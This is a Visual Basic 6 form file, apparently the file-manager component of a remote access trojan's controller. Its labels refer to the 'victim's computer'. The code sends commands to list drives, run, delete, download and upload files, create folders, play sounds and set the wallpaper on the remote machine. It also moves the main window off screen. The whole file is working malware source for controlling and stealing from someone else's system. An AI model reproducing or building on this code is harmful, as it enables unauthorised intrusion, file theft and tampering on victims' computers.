VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form frmFileGM 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "File Manager"
   ClientHeight    =   5490
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   5505
   Icon            =   "frmFileGM.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5490
   ScaleWidth      =   5505
   StartUpPosition =   2  'CenterScreen
   Begin MSComctlLib.ImageList ImageList1 
      Left            =   4470
      Top             =   4530
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      ImageWidth      =   16
      ImageHeight     =   16
      MaskColor       =   12632256
      _Version        =   393216
      BeginProperty Images {2C247F25-8591-11D1-B16A-00C0F0283628} 
         NumListImages   =   36
         BeginProperty ListImage1 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":030A
            Key             =   ""
         EndProperty
         BeginProperty ListImage2 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":0466
            Key             =   ""
         EndProperty
         BeginProperty ListImage3 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":05C2
            Key             =   ""
         EndProperty
         BeginProperty ListImage4 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":071E
            Key             =   ""
         EndProperty
         BeginProperty ListImage5 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":0CBA
            Key             =   ""
         EndProperty
         BeginProperty ListImage6 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":1256
            Key             =   ""
         EndProperty
         BeginProperty ListImage7 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":13B2
            Key             =   ""
         EndProperty
         BeginProperty ListImage8 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":150E
            Key             =   ""
         EndProperty
         BeginProperty ListImage9 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":166A
            Key             =   ""
         EndProperty
         BeginProperty ListImage10 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":17C6
            Key             =   ""
         EndProperty
         BeginProperty ListImage11 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":1922
            Key             =   ""
         EndProperty
         BeginProperty ListImage12 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":1A7E
            Key             =   ""
         EndProperty
         BeginProperty ListImage13 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":201A
            Key             =   ""
         EndProperty
         BeginProperty ListImage14 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":25B6
            Key             =   ""
         EndProperty
         BeginProperty ListImage15 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":2712
            Key             =   ""
         EndProperty
         BeginProperty ListImage16 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":286E
            Key             =   ""
         EndProperty
         BeginProperty ListImage17 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":29CA
            Key             =   ""
         EndProperty
         BeginProperty ListImage18 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":2F66
            Key             =   ""
         EndProperty
         BeginProperty ListImage19 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":3282
            Key             =   ""
         EndProperty
         BeginProperty ListImage20 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":381E
            Key             =   ""
         EndProperty
         BeginProperty ListImage21 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":3B3A
            Key             =   ""
         EndProperty
         BeginProperty ListImage22 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":3C96
            Key             =   ""
         EndProperty
         BeginProperty ListImage23 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":3DF2
            Key             =   ""
         EndProperty
         BeginProperty ListImage24 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":3F4E
            Key             =   ""
         EndProperty
         BeginProperty ListImage25 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":44EA
            Key             =   ""
         EndProperty
         BeginProperty ListImage26 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":4A86
            Key             =   ""
         EndProperty
         BeginProperty ListImage27 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":5022
            Key             =   ""
         EndProperty
         BeginProperty ListImage28 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":55BE
            Key             =   ""
         EndProperty
         BeginProperty ListImage29 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":5B5A
            Key             =   ""
         EndProperty
         BeginProperty ListImage30 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":5E76
            Key             =   ""
         EndProperty
         BeginProperty ListImage31 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":5FD2
            Key             =   ""
         EndProperty
         BeginProperty ListImage32 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":612E
            Key             =   ""
         EndProperty
         BeginProperty ListImage33 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":66CA
            Key             =   ""
         EndProperty
         BeginProperty ListImage34 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":6C66
            Key             =   ""
         EndProperty
         BeginProperty ListImage35 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":6DC2
            Key             =   ""
         EndProperty
         BeginProperty ListImage36 {2C247F27-8591-11D1-B16A-00C0F0283628} 
            Picture         =   "frmFileGM.frx":6F1E
            Key             =   ""
         EndProperty
      EndProperty
   End
   Begin MSComctlLib.ListView ListView1 
      Height          =   4665
      Left            =   60
      TabIndex        =   15
      Top             =   90
      Width           =   4185
      _ExtentX        =   7382
      _ExtentY        =   8229
      View            =   3
      LabelEdit       =   1
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      HideColumnHeaders=   -1  'True
      AllowReorder    =   -1  'True
      _Version        =   393217
      Icons           =   "ImageList1"
      SmallIcons      =   "ImageList1"
      ColHdrIcons     =   "ImageList1"
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   0
   End
   Begin VB.TextBox txtPath 
      Height          =   285
      Left            =   4680
      TabIndex        =   14
      Top             =   4230
      Visible         =   0   'False
      Width           =   765
   End
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   4350
      Top             =   4260
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox txtFile 
      Height          =   285
      Left            =   60
      Locked          =   -1  'True
      TabIndex        =   13
      Top             =   4800
      Width           =   4185
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Set Wallpaper"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   480
      Index           =   7
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   12
      ToolTipText     =   "Set wallpaper"
      Top             =   3720
      Width           =   1100
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Play Wav"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Index           =   6
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   11
      ToolTipText     =   "Play wave file"
      Top             =   3360
      Width           =   1100
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Make Dir"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Index           =   1
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   10
      ToolTipText     =   "Make directory"
      Top             =   1560
      Width           =   1100
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Delete"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Index           =   3
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   9
      ToolTipText     =   "Delete file"
      Top             =   2280
      Width           =   1100
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Get Size"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Index           =   2
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   8
      ToolTipText     =   "Get file size"
      Top             =   1920
      Width           =   1100
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Upload"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Index           =   5
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   7
      ToolTipText     =   "Upload file"
      Top             =   3000
      Width           =   1100
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Download"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Index           =   4
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   6
      ToolTipText     =   "Download file"
      Top             =   2640
      Width           =   1100
   End
   Begin VB.CommandButton cmdFileGM 
      Caption         =   "Run"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Index           =   0
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   5
      ToolTipText     =   "Run file"
      Top             =   1200
      Width           =   1100
   End
   Begin VB.CommandButton cmdGetDrives 
      Caption         =   "Get Drives"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   4
      ToolTipText     =   "Get drives"
      Top             =   840
      Width           =   1100
   End
   Begin VB.ComboBox cbDrives 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      ItemData        =   "frmFileGM.frx":707A
      Left            =   4350
      List            =   "frmFileGM.frx":707C
      Style           =   2  'Dropdown List
      TabIndex        =   3
      Top             =   450
      Width           =   1090
   End
   Begin VB.ListBox List1 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      ItemData        =   "frmFileGM.frx":707E
      Left            =   4440
      List            =   "frmFileGM.frx":7080
      TabIndex        =   1
      Top             =   4830
      Visible         =   0   'False
      Width           =   1050
   End
   Begin VB.CommandButton cmdRefresh 
      Caption         =   "Refresh"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   315
      Left            =   4350
      Style           =   1  'Graphical
      TabIndex        =   0
      ToolTipText     =   "Refresh list"
      Top             =   90
      Width           =   1100
   End
   Begin VB.Label lblStatus 
      BackColor       =   &H80000010&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H8000000E&
      Height          =   315
      Left            =   60
      TabIndex        =   2
      Top             =   5130
      Width           =   5385
   End
End
Attribute VB_Name = "frmFileGM"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim sDir As String 'current directory
Dim sFile As String 'filename
Dim ListNo As Integer
Dim pIndex As Integer 'up directory picture index

Private Sub Form_Load()
If frmFindFiles.Tag <> "Show" Then
   'put to behind screen
   frmMain.Left = -10000
   frmMain.Top = -10000
End If
'clear data
sDir = ""
sFile = ""
txtFile.text = "" 'this is selected file
End Sub

Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
    frmMain.txtAction.text = ""
    Call frmMain.setDirname_13("")
    frmMain.Show
    Unload Me
End Sub

Private Sub List1_Click()
sFile = ""
If List1.List(List1.ListIndex) = ".." Then
   Exit Sub
End If
'is directory
If Right(List1.List(List1.ListIndex), 1) = "\" Then
   txtFile.text = List1.List(List1.ListIndex)
Else 'is not directory
   txtFile.text = sDir & List1.List(List1.ListIndex) 'this is selected file
   sFile = List1.List(List1.ListIndex) 'this is filename
End If
txtFile.text = Trim(txtFile.text)
End Sub

Private Sub List1_DblClick()
'if double click go up directory
If List1.List(List1.ListIndex) = ".." Then
   For i = Len(txtPath) - 1 To 1 Step -1
       'get the directory list in up directory
       If Mid(txtPath, i, 1) = "\" Then
          txtPath.text = Mid(txtPath, 1, i)
          sDir = Mid(sDir, 1, i)
          txtFile.text = txtPath.text
          frmMain.txtAction.text = "FILE_13"
          Call frmMain.setDirname_13(txtPath.text)
          Call frmMain.sendText("FILE_13" & txtPath.text)
          Me.MousePointer = vbHourglass
          Exit Sub
       End If
   Next i
   Exit Sub
End If
'if double click a directory, get the directory list
If Right$(List1.List(List1.ListIndex), 1) = "\" Then
   txtPath.text = List1.List(List1.ListIndex)
   sDir = List1.List(List1.ListIndex)
   frmMain.txtAction.text = "FILE_13"
   Call frmMain.setDirname_13(txtPath.text)
   Call frmMain.sendText("FILE_13" & txtPath.text)
   Me.MousePointer = vbHourglass
End If
'if double click a file, then run it
If Right(txtFile, 1) <> "\" And List1.ListIndex <> -1 Then
   Call cmdFileGM_Click(0)
End If
End Sub

Private Sub cmdGetDrives_Click()
frmMain.txtAction.text = "DRIVE_13"
lblStatus.Caption = "Get drives on victim's computer."
Call frmMain.sendText("DRIVE_13")
End Sub

Private Sub cmdRefresh_Click()
If cbDrives.ListIndex <> -1 Then
   txtFile.text = ""
   frmMain.txtAction.text = "FILE_13"
   lblStatus.Caption = "Refresh the view files on victim's computer."
   Call frmMain.setDirname_13(cbDrives.text)
   Call frmMain.sendText("FILE_13" & cbDrives.text)
End If
End Sub

Public Sub RefreshOK(Directory As String)
   sDir = Directory
End Sub

Function isFile() As Boolean
If Right(txtFile, 1) = "\" Or List1.ListIndex = -1 Then
   MsgBox "Please select one file.", vbExclamation, "File Manager"
   isFile = False
Else
   isFile = True
End If
End Function

Function sFileFormat(FileName As String) As String
Dim i As Integer

For i = Len(FileName) - 1 To 1 Step -1
    If Mid(FileName, i, 1) = "\" Then
       FileName = Right$(FileName, Len(FileName) - i)
       Exit For
    End If
Next i
sFileFormat = FileName
End Function

Private Sub cmdFileGM_Click(Index As Integer)
Dim mDir, upName, upFile As String

  Call frmMain.sendText("FILEGM_13")
  DoEvents
  Sleep 100
  sFile = sFileFormat(sFile)
  
  Select Case Index
    Case 0 'run file
         lblStatus.Caption = "Run the selected file on victim's computer."
         If isFile Then
            Call frmMain.sendText("0" & txtFile.text)
         End If
    
    Case 2 'get file size
         frmMain.txtAction.text = "2FILEGM_13"
         If isFile Then
            Call frmMain.setFilename_13(sFile)
            Call frmMain.sendText("2" & txtFile.text)
         End If
    
    Case 3 'delete file
         If MsgBox("Are you sure want to delete?", vbYesNo, "File Manager") = vbYes Then
            lblStatus.Caption = "delete the selected file."
            If isFile Then
               Call frmMain.sendText("3" & txtFile.text)
            End If
         End If
         
    Case 4 'download selected file
         frmMain.txtAction.text = "4FILEGM_13"
         lblStatus.Caption = "Download the selected file."
         If isFile Then
            frmProgress.Caption = "Download File"
            frmProgress.lblStatus.Caption = "Downloading " & sFile
            frmProgress.Reset
            Call frmProgress.setFilePath(sFile)
            Call frmProgress.setfrmName(1)
            frmProgress.Show
            frmMain.TimerTransfer.Enabled = True
            Call frmMain.setFilename_13(sFile)
            Call frmMain.sendText("4" & txtFile.text)
            DoEvents
         End If
         
    Case 5 'upload selected file
         If Right(txtFile, 1) = "\" Then
            lblStatus.Caption = "Upload the selected file."
            With CommonDialog1
                 .Flags = &H1000 + &H4 + &H8 + &H800
                 .DialogTitle = "Upload File"
                 .CancelError = False
                 .Filter = "All Files (*.*)|*.*"
                 .ShowOpen
                 If Len(.FileName) = 0 Then
                    Exit Sub
                 Else
                    upFile = .FileName
                    upName = .FileTitle
                 End If
            End With
            frmProgress.Caption = "Upload File"
            frmProgress.lblStatus.Caption = "Uploading " & upFile
            frmProgress.Reset
            Call frmProgress.setfrmName(1)
            frmProgress.Show
            frmMain.TimerTransfer.Enabled = True
            Call frmMain.sendText("5" & txtFile & upName)
            DoEvents
            Sleep 100
            Call frmMain.UploadFile(upFile & "")
            DoEvents
         Else
            MsgBox "Please select a folder.", vbExclamation, "Upload File"
         End If
         
    Case 6 'play wave file
         lblStatus.Caption = "Play wave on victim's computer."
         If UCase(Right(txtFile, 4)) = ".WAV" Then
            Call frmMain.sendText("6" & txtFile.text)
         Else
            MsgBox "Please select wave file.", vbExclamation, "Play Wav"
         End If
         
    Case 7 'set wallpaper
         lblStatus.Caption = "Set wallpaper on victim's computer."
         If UCase(Right(txtFile, 4)) = ".BMP" Then
            Call frmMain.sendText("7" & txtFile.text)
         Else
            MsgBox "Please select bitmap file.", vbExclamation, "Play Wav"
         End If
         
  End Select

If Index = 1 Then
   'make directory
   If Right(txtFile, 1) = "\" Then
      mDir = InputBox("Please input the folder name.", "Make Dir")
      If Trim(mDir) <> "" And Right$(mDir, 1) <> "\" Then
         lblStatus.Caption = "Make directory on victim's computer."
         Call frmMain.sendText("FILEGM_13")
         DoEvents
         Sleep 100
         Call frmMain.sendText("1" & txtFile.text & mDir)
      Else
         MsgBox "Can't make no name folder.", vbExclamation, "Make Dir"
      End If
   Else
      MsgBox "Please select a folder.", vbExclamation, "Make Dir"
   End If
End If

End Sub

Public Sub ReceiveData(DATA As String, Index As Integer)
Dim ListTemp As String

    ListTemp = DATA
    'is folders
    If Right$(ListTemp, 1) = "\" Then
       ListTemp = Left$(ListTemp, Len(ListTemp) - 1)
       ListTemp = Mid$(ListTemp, InStrRev(ListTemp, "\", Len(ListTemp)) + 1, Len(ListTemp))
       ListView1.ListItems.Add.text = ListTemp
       ListView1.ListItems.Item(Index).SmallIcon = PicIndex(ListTemp & "\")
    Else 'is files
       ListTemp = Mid$(ListTemp, InStrRev(ListTemp, "\", Len(ListTemp)) + 1, Len(ListTemp))
       ListView1.ListItems.Add.text = ListTemp
       ListView1.ListItems.Item(Index).SmallIcon = PicIndex(ListTemp)
    End If
    List1.AddItem DATA

End Sub

Public Sub ClearList()
List1.Clear
ListView1.ListItems.Clear
ListView1.ColumnHeaders.Clear
End Sub


Public Sub setIndex(Index As Integer)
ListNo = Index
End Sub

Private Sub ListView1_Click()
   List1_Click
End Sub

Private Sub ListView1_DblClick()
List1_DblClick
End Sub

Private Sub ListView1_ItemClick(ByVal Item As MSComctlLib.ListItem)
List1.ListIndex = Item.Index - ListNo
End Sub
